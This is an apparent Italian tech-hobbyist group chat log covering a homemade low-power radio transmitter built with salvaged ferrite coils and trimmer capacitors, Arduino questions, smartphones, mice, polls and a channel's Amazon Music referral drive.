idk, non so quanto è lungha e per che frequenze è stata calcolata. L'deale sarebbe avere un analizzatore d'antenna, ma costa giusto un po'
L'ho presa da un furgoncino quindi credo FM
Collegata al baofeng prende molte stazioni FM
Credo che sia FM quindi
con 100mW, il giusto hardware e un pezzo di filo da un paio di metri tiravo un centinaio di metri sui 100MHz
porc.....beh, ci proverò
FM o AM non cambia nulla, cambia antenna in base alla frequenza su cui si lavora
beh se per quello con la giusta antenna tiri fino a 2/3km pure il wifi a 2.4GHz
come hardware non era altro che un oscillatore e un modulatore fatto con un totlale di 2 transistor, qualche condensatore, qualche resistenza e un induttanza avvolata a mano
solo collegando come antenna ricevente al pc quella che ti sei costruito
Le mie radio fanno 5km a campo aperto
Yeee
Scusami, con FM sono abituata a dire 88-108 MHz, so che è sbagliato
Non ho la base però, come la collego?
Mettendo le dita nella corrente
emmhh....la attacchi....al circuito
all'uscita del tuo segnale
con la mia baofeng cinese sulla banda dei 2m tiro una decina di km (5W se non ricordo male)
Ma ha una base a cui va avvitata e io non ce l'ho
dovrebbe essere un'antenna sbilanciata, quindi il filo centrale del connettore va all'uscita del trasmettitore
vabb, è futile, gli saldi un cavotto al cavettino centrale e via
e l'esterno va collegato alla massa del trasmettitore
esatto
comunque vi consiglio di studiare prima di mettere mano a cose di cui non conoscete il funzionamento (io ora vado a letto quindi non seguirò piu la chat)
hey, io mi sto studiando questo ora
quando mai arriverà...comunque la radiotecnica per radioamatori di nero neri
 analisi non standard, sembra fighissima
Yup
Ma anche alquanto... Inutile?
È una cosa molto a sé stante, una specie di giochetto per dire "posso fare anche così"
Magari tra 50 anni diventerà lo standard, ma per ora... Non si fa nemmeno come corso obbligatorio a matematica
La matematica è bella per quello 
Esatto
EH no
In matematica non c'è nulla di "inutile"
Purtroppo :(
❤️❤️
Ti posso chiedere una cosa in pvt?
Vadi
Qualsiasi cosa la usi per fare altre cose ecc
Si maaaaa manca solo che invece che usare x e y usi stellina e cuoricino e diventi la mia prof qua
∫f(❤️)g'(❤️) d❤️= f(❤️)g(❤️)-∫f'(❤️)g(❤️) d❤️
Così?
Tipo
Aiuto.
Come per spiegare i moduli : |☆|=+-♡
🤔tu andresti d'accordissimo con Viviana..anche lei è una matematicomane 🤣
Ottimo peccato che non sappia chi sia
Piango
la mia fidanzata ingegnere elettronico
Matematicomane e ingegnere
Non vanno d'accordo 
Nerio neri ha scritto tra i migiori libri in italiano per radioamatori
e invece si
  Video molto interessante 
direi che abbiamo un plebiscito 

Adesivi?
Sei un falzooo caso strano la percentuale è 87 e tu sei korry87
Pulizia kontattiìïiíîï
❤️
è la vendetta per non avermi fatto moderatore delle live🤣
Yep
Windows e i suoi scherzi epici finiti male: ti acceco col secondo monitor se spegni il primo
mamma in agguato stile pantera
Posso usare il cavo dell'antenna TV?
Si, se è solo per il cavo si, in realtà anche un qualunque cavo accaso abbastanza lungo in sostanza
Perché è schermato
Per l'impendenza non si rompe il TX?
A beh...per quello....allora boh prova
Un antenna per rx è buona anche in TX allora?
Beh in realtà non ne ho idea
a chi dava problemi SpotifyConverter che avevo mandato sul canale? ora è aggiornato, dovrebbe funzionare
I cavi tv hanno 75Ω di impedenza, tutti gli altri 50Ω.
Yes a meno che tu non trasmetta con grosse potenze
Il cavo TV posso usarlo?
Ho fatto pubblicare il tizio della RAM di ieri su iGNUranza 
Get ready for op6
Ho allagato lo OnePlus One
brutto
Dipende dalla presenza del notch
Ryp pikkolo OPO
il notch c'è, ma anche il dietro in vetro a me non piace
 Se 1+1 ti ha lasciato ti consiglio caldamente Xiaomi Mi A1 (ha Android 8 Stock all'interno, dato che è un Android One) lo trovi su Amazon a circa 200€. mentre su banggood o Gearbest sulle 170€.
Mah oddio
Il mi a1 ha una fotocamera penosa
Piuttosto il note 3
SAR troppo alto, tocca quasi i limiti di legge europei
Io sono sempre dell'idea che le foto le fanno le macchine fotografiche. Se vuoi una 20Mpx prendi Honor 9 Lite
E le Instagram stories?
XD
Non è un problema di megapixel
Ma che al tramonto non puoi farti un selfie
E che non mette a fuoco
Per dire, i pixel avevano la miglior fotocamera su uno smartphone con solo 12megapixel e una camera sola
È stato messo nello shop il Google home
In pratica mentre ero in doccia stavo guardando un video sull'olio riciclato nei ristoranti streetfood in Cina, insaponandomi ho dato una gomitata alla mensola e ho sfondato tutto 
Comunque per le morti causate dal food poisoning in Cina c'è la pena di morte 
 

la pena di morte trump voleva metterla  per chi spaccia
Si, quando rientro a casa.
Oppure cerca else kit.
Producevano un trasmettitore fm per banda 88/108 Mhz
Non riesci a realizzare un antenna di quelle dimensioni viste le distanze in gioco,ma puoi realizzare antenne compatte conmunque.
Un antenna lavora identicamente sia in TX che RX a patto che rispetti l'adattamento d'impedenza.
Quindi guarda l'antenna entrocontenuta nelle radio Am nella banda 530/ 1600 khz.
È una bobina avvolta su nucleo di ferrite. Puoi usare quella.
Quanti watt?
Mettilo nel riso, stanotte il riso attirerà i cinesi che ripareranno il telefono🤔
Credo 0,5 / 1
Gli ho anche messo il biglietto
Bella, vado subito a rubare la ferrite dal laboratorio di biologia
HAHAHAHAHAHA MITICO
cosa c'è scritto
Google traduttore è tuo amico 
ah mi tocca
 Ti sono arrivati i soldi di amazon music Unlimited?
Funziona?
Adesso lo metto dentro al riso assieme ad un biglietto con scritto «亲爱的中国人，这里是一些米饭。 请修理我的一加科一», dovrebbe sistemarsi 
Yess, grazie a tutti quelli che hanno subscribato
Solo 6 persone in realtà... Però sono comunque 27€ regalati da Amazon 
Sul serio?
Dai spalma un po' sui vari canali
È per una giusta causa
Probabilmente molti lo hanno fatto con altri canali...
SALVATE ANCHE VOI UN PICCOLO MARCO SELVATICO IN VIA D'ESTINZIONE
Ragazzi urgente:
Array ("" => "") di PHP come faccio in Arduino?
Si in effetti non hai tutti i torti...
Io l'ho scoperto con lui e quindi boom te li meriti tutti vecchio
Qualcuno di voi tra oggi e domani viene a Parma alla mecspe?
Eh non puoi in c fare array con indici non interi
Io volevo fare 
chat x = 'char';
Una funzione con un elenco di char che restituiva il valore in stringa
Mmm.. Non ho capito 
Se vuoi abbinare due stringhe puoi o usare robe della standard library oppure fare due array o un array di strutture tipo
7, io lho appena fatto
char x = '#';
getString(x);
String getString(char input)
{
String x[] = array("#" =>"hashtag");

Return x[input];
}
Eh no il C non funziona così 
Soluzioni?
Basta riavviare
...
Haha
Devi scrivere del codice in più... Tipo fai due array, uno con la prima parte del dizionario e uno con la seconda e poi cicli sul primo finché non trovi l'elemento cercato e a quel punto prendi l'i-esimo elemento del secondo

Oppure usare oggetti della std
Detto in parole povero sbattici la testa per 3 ore o lascia perdere
Nah
Tutto ciò mi serve per leggere il seriale
Cambiando argomenti il bot delle offerte come funziona? 
Un mio amico vuole che ne creo uno simile per delle offerte di prodotti per macchine e "robe varie" -cit.
Ma non ho la minima idea di come funzioni 
Senti 
Se le contatto in privato non mi permabanna la vita?
Hai il suo permesso
Yeee
Non ti preoccupi della fotocamera?
Eh?
qualcuno è di Napoli?
o Paestum e dintorni
Non ti preoccupa il fatto che potresti avere un virus che potrebbe riprenderti mentre fai la doccia?
Ahh non c'eri tu ieri?
Comunque sono 3 corsi fatti da 3 universitari, su web developing,arduino e creare videogiochi
Finche guardo un video su youtube il telefono sta lì in alto sulla mensolina e bom
Aah nono
Se vuoi continua il corso base però
Vabbè tanto non c'è nulla da vedere 
Ahh okay, allora ne fanno più di uno
io sabato
Dove li trovo?
Sono organizzati dalla mia scuola, non sono corsi online
Ah ok
Pubblicità
Da 2 settimane che non programmo in c++ me lo sono già dimenticato
Con java non ne parliamo proprio
Gg
È quello il suo antivirus ahah
i fake grandi come una casa:

Io
Io
Eccoleee
belle  che modello sono
Hybrid
Belle
Come funzionano le carte virtuali? Vorrei registrarmi ma non ho una carta di credito
sono come una normale cc
scometto che li usavano invertendo la polarità per fare attentati
Lol
Eh le emette la banca di solito... Non so se ci sono anche servizi online usa e getta
Ma per avere il ref su amazon music bisogna avere un tot di seguaci su un social?
Non penso
Sisi ed è anche abbastanza restrittivo
si, e non funziona uguale con tutti..FB e Instagram richiedono molti più follower rispetto a YouTube
Comunque va a loro driscrezione: tu devi indicargli il tuo sito e/o le piattaforme social dove sei attivo e loro decidono se approvarti
È anche più difficile vendere seriamente, su Facebook e Instagram
ragaa non mi fa aggiungere un bot al mio canale secondo voi come mai?
Da android non puoi più farlo mi sembra
lo so..intendevo le pagine dei gruppi dove postano le varie offerte giornaliere
Per tutti quelli che si sono iscritti GRATUITAMENTE ad Amazon Music Unlimited: grazie infinite per il supporto al canale, voi vi state godendo un mese di 
 ma Amazon ha dato 4.50€ al canale overVolt per ciascuna delle vostre iscrizioni. Spenderò quei buoni ovviamente 100% per 
 e 
 per portare video di 
 sul canale 

Per tutti gli altri... Siete ancora in tempo! Iscrivendovi 
 per un mese a Music Unlimited costringete la ricchissima Amazon a regalare 4.50€ al canale (e avete un mese di "Spotify di Amazon" gratuito, che male non fa) 



davvero 4,50??

Quindi non ne posso fare una sul web?
raga qualcuno di voi conosce siti per comprare buoni amazon con paypal? se si ditemeli grazie
Qualcuno sa come fare l'impulso da Arduino a questo dimmer??
Sto facendo delle prove ma la luce continua ad accendersi e spegnersi
si e no, le carte di credito funzionano che che la oanca amticipa e tu paghi tutto a fine mese, quelle che puoi prendere su internet sono carte di debito ricaricabili o prepagate che siano
Me ne servirebbe una ricaricabile
Ma non fisica
Paysafecard
Non è una carta
Portafoglio virtuale
La carta è fisica però
???
qual'è il problema, non cambia niente
Ah cavolo
Eh beh sennò ognuno lo farebbe per il proprio amico 
Per me è un problema
Ook ho la mia antenna ma sono giusto un pelo tanti cavi
Aiuto
Beh intanto riscaldo lo stagnatore per dissaldare tutti sti cavetti, poi andrò un pelo a caso
che è?
Esatto
Vabbè uno di sti giorni lo farò
L'ho scritto ._.
Un'antenna aliena

Romboliii
Comorerarei Google home? Costa 60€
Ps: Gia disponibile il preordine da Unieuro o Euronics se non ricordo male
Ho visto ma aspetto di vedere che fa con i comandi in italiano
Cioè se gestisce bene le integrazioni domotica e 3rd party
Lool
Mmmhh...ho trovato qualcosa nella vecchia radio marcia...dimmi che te ne pare
Ho saldato su delle graffette per attaccare tutto alla breadboard poi
Per me è un trasformatore
Ci sono 2 induttori intorno ad una barra di ferrite
Però non saprei cosa attaccare...quale dei pin più che altro
non credo sia un trasformatore, anche perchè il trasformatore l'ho già cannibalizzato e riutilizzato ._.
(Ora finisco su ignOHMranza... E se ci finisco, a mia discolpa dico che non sono esperto di ste cose)
 ammettilo che li spenderai tutti in speck e squillo di lusso
Per tutti quelli che si sono iscritti GRATUITAMENTE ad Amazon Music Unlimited: grazie infinite per il supporto al canale, voi vi state godendo un mese di 
 ma Amazon ha dato 4.50€ al canale overVolt per ciascuna delle vostre iscrizioni. Spenderò quei buoni ovviamente 100% per 
 e 
 per portare video di 
 sul canale 

Per tutti gli altri... Siete ancora in tempo! Iscrivendovi 
 per un mese a Music Unlimited costringete la ricchissima Amazon a regalare 4.50€ al canale (e avete un mese di "Spotify di Amazon" gratuito, che male non fa) 



Vabbè che siano spesi in attrezzatura o speck sono comunque in entrambi i casi soldi ben spesi
Come oggi:
"Ragazzi se un fumatore acquista un pacchetto da 2.50€ ogni settimana entro 22 anni spenderebbe 20.075€, immaginate cosa potreste fare con tutti questi soldi!"
Si alza un ragazzo fantastico che mi fa "minchia mignotte per i prossimi 11 mesi"
Stima assoluta
Mi sono arrivati gli nrf24l01 come faccio a connettere Arduino con il raspberry server mqtt senza usare la seriale usb
Pensa poi se uno si compra un pacchetto da 5€ ogni giorno...
È ricco, decisamente
Per fortuna non fumo
è una truffa
È ricco di malattie polmonari, anche

Decisamente
Buongiorno! Qualcuno ha fatto le regionali delle olimpiadi di scienze naturali oggi?
questo mi ricorda che domani in scienze della terra interroga....e io sono già stato interrogato
19.17 e devo ancora iniziare a studiare chimica ahahaha
aiuto, non so come collegare sta cosa...e soprattutto, non ho una radio am, consigliatemene un paio di buone a poco prezzo che tengano sulle bande LF, MF e HF, e poi magari anche VHF se è fm ma più che tanto la fm non mi interessa, una radio per la fm già ce l'ho
hehehe, io sono fattissimo, ho finito tutto oramai, adesso almeno 1 settimana di nulla
Comunque c'è qualcuno von una connessione veloce e con tanta pazienza da farmi un piacere? Si tratterebbe di scaricare la iso di windows (o da mct o direttamente da edge) per poi caricarla su Mega. La mia connessione è lentissima e purtroppo non riesco mai a completare il download da browser, ma con mega potrei farlo ripartire dal punto dove si è fermato
io ho 100 mega
E poi c'è verifica lunedì, interrogazione sabato o martedì, verifica mercoledì
dammi il link dove scaricare
si ma tranquillo devi stare
tanto...
Grazie mille ti dico i dettagli in privato, dammi qualche minuto che recupero nuovamente i link
ok scrivimi
Io mi chiedo come mai io non trovo il cazzo di tempo per fare qualsiasi cosa e poi invece c'è gente in classe nostra che riesce perfino a metterci 3 allenamenti a settimana nel tempo libero che comunque trovano
beh...perchè tu sei sempre occupato, tra scout, cucinare pasta, fare la pasta madre, fare ogni cazzo di cosa, dare ripetizioni a gente, tutti i progetti tipo blender....vuoi che continui? è normale, fai come me, quando qualcuno ti chiede qualcosa te fissalo, e aspetta che se ne vada
La pasta madre è morta
saaad
Diciamo più che l'ho uccisa
comunque oggi ho cannibalizzato un cilindro di ferrite :D
e ora...mi serve una radio decente, help
Il tuo telefono
no...come?
Lo apri
1)non esiste il chip am 2)è da tipo il 2005 che non abilitano più il chip fm che ci sta sopra....
soffoca
Annulli la garanzia, ah no aspetta troppo tardi
Dissaldi il ricevitore
Screenshot (22 mar 2018 19:43:51)
ma se lo prendo aggratis poi se chiedo il rimborso mi danno 89 cent?
No
No ovviamente
peccaaaatoooo
Ahahahaha per un mio amico e stato così.. Ha preso iPhonex a 900 euro... L'ha restituito e gli hanno ridato 1400€ (prezzo di listino)
Il trading di cryptovalute
Nella vita reale
Ahah
Certo, quella è un antenna per onde medie 
Va sicuramente bene a ricevere i segnali che vuoi ricevere.
Per accordarla col trasmettitore non saprei.
La cosa migliore è un compensatore in parallelo e provare la distanza maggiore
Si maaa....come la uso? Nel senso, io ho solo un cavo da cui esce segnale, cosa faccio, connetto ad un cavetto di una bobina delle tante il segnale e sul finale lo lascio così senza attaccarlo a gnd o come?
A gnd
Ok
Le altre bobine le mollo li a non fare nulla?
Poi per scegliere la bobina vado a tentativi o posso già sapere quale usare?
Si, probabile che una era per onde medie onde corte e onde lunghe
A seconda di quante bande aveva la radio che hai smontato
Wait a moment, immaginavo fosse così
Comunque sono esperimenti....
E quindi ho fatto 2 foto
Aa sto punto...nelle foto ho anche quelle conness3 dietro, guardo la connessa dietro ad lw e uso quella, apposct
Hai 4 bande
Vedi i 3 compensatori in parallelo alla bobina?
Ok wait, so cos'è un compensatore e a cosa serve ma non ne ho mai visto uno manco nelle foto qual'è? Quello rotondo azzurro e i 2 ai suoi lati?
Sono quei 3 rotondi allora?
Troppo cattivo?
no, sei giusto
Qualcuno sa usare RX2 G e TX2 G?
Esatto, sono dei condensatori variabili
Se ben ricordo i bianchi 4/20 pF
Scusa ma mi si era scarica ta la batt.
X chi mi aveva chiesto Tx banda 88/108 Mhz, 2 w
ook thx, e cosa ci faccio? li connetto come? segnale-condensatore variabile-antenna tipo?
Tutto in parallelo
Massa tua scheda a compensatore e un capo bobina
a ok, si, sono tordo, prima avevo letto parallelo ma inverto sempre serie e parallelo mentalmenteok, quindi....come in parallelo? tipo segnale-e poi? come faccio a mettere in parallelo? quanti condensatori variabili servono?
Segnale all altro capo bobina e compensatore
1 compensatore solo
ook
mi sa che ci vuole un disegnino qua
altrimenti nessuno capisce nessuno
Tieni i fili cortissimi al compensatore, altrimenti diventano bobine aggiuntive
quindi, segnale--condensatore--capo_bobina_1 e poi capo_bobina_2--gnd
ok
Il compensatore ha 3 terminali
ok, dimmi com'è fatto vah
Provo a farti un disegno
thx
E che sono a letto adesso, ieri  notte ho dormito 2 ore...
si beh, vai a dormire se devi, ti capisco
puoi spiegarmelo pure domani eh
Abbiamo lo stesso mouse
yee
preso all'elettrocasa
Plastichetta da due soldi
Ma comoda
Quando lo stringo forte rischio di romperlo
pagato tipo 50 euro sto mouse
Sento la plastica criccare
Loool
Sera
naah, che cazzo sei hulk, io manco a martellate lo rompo sto coso
No dico
Aspe
 ma quando stampi in 3d sul piatto metti qualcosa?
abs juice
se stampi pla non serve nulla
Preme i tasti quando premi troppo la plastica 
Però ammetto che è resistente
Ho preso pla, per iniziare
Le botte che gli dò sono forti
Specialmente quando sclero
Ogni quanto pulite la pallina del mouse?
Le palline non ci sono più da un po'
mai fatto
credo intendesse la rotellina
o il sensore laser
Ho ritrovato questo messaggio
E niente
Ti amo più di prima 

Volevo vedere quanto sono vecchio. Attendo ancora il risultato del sondaggio fatto mesi fa 
Vecchissimo
sondaggio?
Nulla, ho appena visto i risultati, cercando "sondaggio" nella chat


10/10 – 6
 60%

1/10 – 3
 30%

2/10 – 1
 10%

3/10
▫️ 0%

4/10
▫️ 0%

5/10
▫️ 0%

6/10
▫️ 0%

7/10
▫️ 0%

8/10
▫️ 0%

9/10
▫️ 0%

 10 people voted so far.
Sondaggioooo
Epico non è uno scherzo
Finito male
Finito bene iniziato male
si
Giulian non vale votarsi da soli 

uoooppss
uoo cos'è sto razzismo, almeno 11/10
Non puoi mettere più di 10 oppzioni
volete le foto mentre mi dispero sapendo di non poter scendere con la funivia e sapendo che l'unica strada è la pista 51 a cortina?
occupiamo il bot
Ragazzi Chi è che ha più di 40 anni xD


Dai 15 ai 20 – 15
 48%

Dai 20 ai 30 – 7
 23%

Dai 12 ai 15 – 5
 16%

Più di 40 – 2
 6%

Dai 30 ai 40 – 2
 6%

Meno di 12
▫️ 0%

 31 people voted so far.
Cicca aveva fatto un sondaggio bellissimo ad ottobre
Stupendissimo
Come me 
con tutti i grafici fieri...ma in tutto ciò quello che mi è piaciuto di più era la lista tipo scontrino del lidl, quella è bellissima
All'inizio ha la stessa bassline di Charlie Puth - Attention
.
AHAHAHAHAHAHHAAHHAAHHAHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHAHAHAHAHHAHAAHHAHAHAHAHAHAHAHAHAHAHAHAHAH
Cioè, dato che non fa ridere, almeno farla per bene...
A me fa ridere xD
Quanti errori
Anche il fatto di essere crashato dopo aver inviato il mesaggio
Il tizio che scrive ha un iPhone, non Samsung
Eh, come ha fatto a copiare il simbolo ed a inviarlo?
Poi altri errori non ne vedo...
È più sbagliato dell'esistenza del php
Comunque complimenti per le guide
Che guiude?
Quelle su 
ah ho capito adesso 
Grazie 
"Il fumo fa male,
Ma il php è peggio"
Chi gioca a dcs world?
 sito quasi finito ma manca ancora un po' di grafica
Aprirlo sul computer che non è ottimizzato sul telefono
Apritelo*
Stavo per chiedertelo
PS ora uso atom non più il blocco note
Ma gli errori sono voluti per essere simpatico, o sono proprio errori?
Io lavorerei anche un po' sulla grammatica prima della grafica

"Un po' di grafica"
Ma poi non è spam postare il proprio sito?
Sono errori
Mi sono dimenticato di toglierli
Ah
Dipende dal sito
Se sono tipo dei portfolio vanno anche bene in teoria
Però per sicurezza chiedo
Vedi di correggere, comunque dai è un buon esercizio farsi un sito
grazie Simo..lo sai, io solamente musica seria e di qualità
Buongiorno
'Giorno 
Giorno ✋
Avete mai preso i Lucky bag su gearbest? 🤔 sono tanto una fregatura, a parer vostro?
Raga sul rock64 che sistema operativo si mette?
Io ho DietPi
lucky bag?
Quelle dove paghi risparmiando ma non sei sicuro al contenuto
Del*
ah, ok
I ragazzi del mio classe lo fano......fumano un sacco ogni giorno .-.
Cos
windows vista
Raga scusate, abbiamo ritrovato a scuola un imac ma non sappiamo la password come possiamo fare per reimpostarla o per accedere?
Lo restituite al proprietario/lo portate in segreteria
Ci serve per un laboratorio
Ma lo avete trovato e non è vostro
Ma non è un fisso un imac?
E quindi? Se ha la password c'è un motivo
È della scuola ma neanche i prof ricordano la password
Approvo ciò che dice Lorenzo. Portalo in segreteria o, tramite seriale, controlla di chi è per restituirlo. Sicuramente verrai ricompensato dal proprietario
Allora sono fessi loro 
Abbiamo risolto, abbiamo ritrovato un foglio dove c'era scritto
E quindi non si può perdere un fisso xD
Nel caso capitasse di nuovo, contattando la apple, si può recuperare tramite Apple ID
Comunque sono cazzi dell'ufficio tecnico della scuola e meno ci si mette mano meglio è per evitare casini
Hai ragione
Non gli piace
Probabilmente sarebbe il telefono che comprerei io allo stato attuale delle cose
Ah ok
Ma io dicevo il post soprs
sucsa....avevo risposto ad un mess dove dicevano che fumare per 5 euro al giorno e 20 euro alla settimana  e troppo
I
Non hai capito quale post intendevo
Ah 
non è interessante? 
Eh non so quello di cui parlano
farmattone tattico
proprio non lo dicono  boh meno che sentire...
Come faccio a far rimanere in esecuzione un file 
 con screen?
Apri una sessione di screen, esegui il programma lì dentro e poi esci
Io preferisco tmux però
Come si fa? 
Ah niente, ho capito
Sapete come si chiamano le tovaglie con le misure in cm stampate sopra tipo quelle che si vedono nei video di YouTube?
Link dell' orologio?
 tipo questa?

Thx


5) Arduino e Raspberry (anche kit) e Stampanti 3d – 14
 47%

1) offerte di Informatica (tablet, notebook, tastiere, mouse, accessori vari, zaini portapc) – 6
 20%

4) Faidate: offerte su trapani e altri attrezzi, Tester, Kit vari, saldatori e stazioni saldanti – 5
 17%

2) Fotografia: fotocamere, obiettivi, filtri, treppiedi, borse e altri accessori – 4
 13%

6) Droni e accessori – 1
 3%

Telefonia: Smartphone (anche cinesoni con coupon) e accessori
▫️ 0%

6) Offerte di sconto su Software vari
▫️ 0%

 30 people voted so far.
 fissalo cosi ci regoliamo per le offerte
Solo un voto?
🤔non so come si fa per mettere voti multipli
(hai dimenticato il 3)
me ne sono accorto dopo
Ah con 
 non lo so nemmeno io, con 
 ci sono tante opzioni tra cui il voto multiplo
capito
 non avessi avuto un treno da prendere ti avrei offerto un caffé
Mensa povo1?
Il traditore che mi lascia a povo 0
Perché povo e non polo?
Perché il posto si chiama povo 

Nop, ti ho incrociato mentre uscivo da un'aula di povo1
screen python3.5 
Risolto grazie
 complimenti per il video con saddy
🤔quello uscito oggi?
Si
ora me lo guardo
Esiste una page dove ci sono quelli compatibili?
Tutti i dispositivi compatibili con DietPi? Si il sito ufficiale 
Qualcuno conosce una guida su come fare un blog in WordPress?
Ci sono milioni di guide usa amico Google
Allora secondo il tuo ragionamento questo canale non dovrebbe esistere basta cercare su Google no?
Io ho chiesto perché è pieno di spazzatura e non ne trovo uno decente
🤔chiedi a Cicca, lui ti saprà consigliare..oppure a Pesavento
Per chiedere aiuto vai sui forum, questo non è un gruppo tutorial
vabbè calmiamoci tutti, ha soltanto chiesto se qualcuno aveva una guida oppure un pdf
fatevi tutti quanti una camomilla
A me va bene però le regole devono essere uguali per tutti
ma infatti hai fatto bene a chiedere, tranquillo

 
 voi potete aiutare 
 con Wordpress? avete qualche guida buona?
Ma che differenza c’è fra un mouse da 100€ e uno da 20€?
Le lucine 
parecchie..Ergonomia, qualità del sensore, software per porogrammare i tasti, rotella in alluminio con frizione, tasti programmabili, qualità delle plastiche, possibilità di usarlo su più dispositivi contemporaneamente, batteria al litio integrata e ricaricabile..ce ne sono di differenze
no fidati, se prendi un mouse dell'Auchan ed un MX Master la differenza la senti e la vedi
Si si lo so, prima avevo un cazzabubbolo che non so neanche da dove avevo preso mentre ora ho un klim aim e si sente la differenza, anche se anche quello di adesso non è il top
e tu sicuramente giochi anche al pc..io che ci lavoro solamente, da quando ho scoperto i mouse verticali e le trackball non esistono altri tipi di mouse per me (tranne l'MX Master, ma costa tanto)
Si va tanto meglio con quelli verticali?
Eccolo :D
Logitech M100..ottimo mouse economico
Ma
se lo usi per tante ore e soffri di dolori al polso e alle dita sono i migliori
Come fai a saperlo tu che non lo so neanche io? 
 lo sai che sono un mostro in componentistica mica è una novità
Si si, lo so
eccolo qua  

Credo che hai sbagliato
Non è proprio così, è un po' più schiacciato
questo è il nuovo modello, quello che hai tu è il modello 2006
AH
Sei un mago...

In che senso usare un mouse su più dispositivi contemporaneamente????
ci sono alcuni mouse wireless o bluetooth che possono essere usati contemporaneamente con 3 dispositivi (3 pc oppure pc-notebook e tablet)..l'Mx Master e l'Mx Master 2s sono 2 di questi mouse
esistono anche tastiere cosi
Ma come fai ad usarli?
Pagato 3€ più di due mesi fa (efficienza dei postini cinesi)... Vediamo come va 
identico al mio
cioè... piu o meno
C'è Synergy per questo
è a pagamento però
per un secondo ho pensato che fosse un libro 
Gigantescooo
Anche io
Piu che altro tipo 3-4 libri
Pesa 14kg 
Sarà bello stabile!
Scherzo non è un treppiede
Raga
Sto sistemando un vecchio PC per fare cose
raga avete sololearn?
La ventola parte a botta appena lo accendo
polvere
sicuro
Controllo, è stra sporco
Come cazzo la smonto?
ma che wtf è? 
Un preassemblato dell
ma è un desktop?
La classica merda stile anni 2000
Si
Secondo te sto coso ci sta in un portatile?
boh, controlla se ci sono dei bullonazzi enormi da togliere
da così non vedo quanto è grosso
Ahhh ma intendevi sto cosone verde
io pensavo tutta la mobo
comunque non credo
Mi ricordi il mio ex portatile con l'alimentazione smonca, dove ci sono ancora metà delle mie robe, e che devo sistemare
Sto creando un applet su IFTTT  che al ricevimento di una determinata mail prende il testo e lo aggiunge a un file dropbox. tramite i filter code in javascript posso cancellare il contenuto del file prima di scrivere il nuovo testo?
Da NAS puoi condividere il sistema operativo?🤔
non penso perché per aprire i filendalla rete credo che il pc abbia bisogno di un qualche protocollo di comunicazione che semza sistema operativo nom è presente
Hot news
Era l'alimentatore
Ahahhahahahah
Secondo me stava per scoppiare
Ora ci metto l'itek di fiducia
Tanto per stare in tema alimentatore di merda
lelelelelllelelelellelelel
Non non siamo Youtuber
La gigantesca testa video Manfrotto con controbilanciamento peso e pan fluido mi è arrivata oggi... Ma è ancora scontata di 50€, approfittatene! 
Si sa mai 
sono appena tornato da scuola 
Che voi sappiate il subsystem linux ha meno prestazioni?
*plugin vst craccati*
Perché vorrei usare il mio PC anche come server e mi è più comodo Linux (anche se potrei benissimo fare le stesse cose con Windows ma è più scomodo usarlo come server)
Eh
EH
probabile, ma non sono sicuro, non ho provato
*368 FLP*
Dopo ci provo e vi faccio sapere, Windows con openssh e screen
Li canzun
 per 3 euro hai schermo, 3 sensori touch e un po' di pcb da bruciare, un affare insomma
Hahahahah ha i pixel grossi come arduini 
Meglio investiti in una birra piccola 
sono permessi screen da stackoverflow che contengono bestemmie nella domanda?
Se le censuri sì
censurata...
Meanwhile, in the magic world of Italian Memes...
un infame di un amico di mio padre ha provato a vendergli sta roba a 10 euro.Ovviamente gli ho detto di no si sentiva la cinesata da km
io ho un clone dell'Apple Watch che gli ho dovuto pure togliere la batteria perché si accendeva da solo
Bella roba 
poi avrei anche paura a tenere al polso sti cosi cinesissimi, chissà quante radiazioni ti sparano
quando lo compri dovrebbero mandarti lo scontrino con:


Oltre a essere di materiali scrausi che cosa ha andorid wear o un vecchio os proprietario con solo sveglia e quattro cavolate?
non penso sia definibile OS
probabilmente non ha manco la sveglia
se ci metti la SIM potevi usare facebook da browser e whatsapp
col bluetooth puoi solo farci le chiamate e sentire l'audio del telefono sullo smartwatch che si sente ancora peggio
ah sì, scaricando un'app con un nome in cinese ti copia il testo delle notifiche sul telefono
però se il telefono è bloccato non ti arriva il contenuto della notifica LOL
Perché con uno schermo così piccolo Facebook é usabile.
Senza dimenticare che a volte ci vogliono ore per far funzionare tutto perché l'app richiesta sul telefono non funziona o é tutta in cinese
mmmhhh....ma non manderebbe in outpuit corrente pure nell'arduino/nxp?
perchè io facendo così connetto sia segnale in entrata che in uscita sullo stesso identico pin
sulla stessa saldatura
mi preoccupo giusto perchè sto coso aumenta giusto un pelo tanto il voltaggio
Comunque ho connesso così, dimmi se sbaglio, comunque quello verde è l'input che arriva sul condensatore variabile
ASPETTA NON ALIMNTARE
CORTO CIRCUITO
grazie
vai, dimmi come risolvere
I due lati del compensatore sono connessi insieme
è?
Ma cosa stai cercando di fare, un oscillatore LC?
cerco di trasmettere a 1KHz
non sono connessi insieme, le linee della breadboard vanno in orizzontale, solo quelle del + e del - sono verticali
Sul blu hai -, sul viola +?
yep
C'è pure scritto🤷‍♂
Togli quel viola
Ma sarebbe?
Condensatore variabile
why? non va alimentato dalla 5v?
Wtff🤷‍♂
Non ne ho mai visti cosi
quindi sarebbe un : "puntina davanti - segnale in - segnale out" ; "puntina laterale - gnd" e poi vabb, "finale antenna - gnd" ma senza alcun "puntina laterale del condensatore - 5v" ?
Come nella foto di prima il compensatore ha due masse (1) e un uscita variabile (2)
si...quindi.... segnale in ingresso su quella centrale e anche in uscita sempre sulla stessa centrale, e poi, 5v su puntina laterale sopra, no?
sono entrambi gnd quelli laterali?
Esatto
Ma non ho capito, con un Arduino trasmetti e con l'altro ricevi?
no per ora l'obbiettivo è trasmettere e poi ricevo con una radio, ora uso l'nxp che usa direttamente l'analog output
devo intanto usarlo, poi magari tipo trasmetto dati in binario e li ricevo con un microfono connesso ad un arduino mentre la radio va, mi sembra che qualcuno l'avesse fatta questa genialata, su youtube
ciao ragazzi, qualcuno tra voi programma stm32 o conosce qualche gruppo?
comunque, per ora voglio riuscire a trasmettere solo
ma a sto punto se attacco entrambi a gnd metto in corto circuito i due laterali...ok che sono connessi a gnd ma sono in corto, comunque non dovrebbe cambiare nulla, no?
Connettendo così...sbagliando?
per me è fuggito in messico quando si è accorto di quanto doveva pagare di debiti sui razzi negli ultimi 10 anni
Elon Musk ha eliminato da Facebook gli account Tesla e SpaceX. Apperò.
Ma io non ho capito che sta succedendo a facebook
Elon Musk ha eliminato da Facebook gli account Tesla e SpaceX. Apperò.
Certo che fai corto, togli il viola
e allora senza viola...come faccio?
non ho 2 gnd
Dai la massa al al condensatore e alla bobina
Dai il segnale al condensatore e la bobina
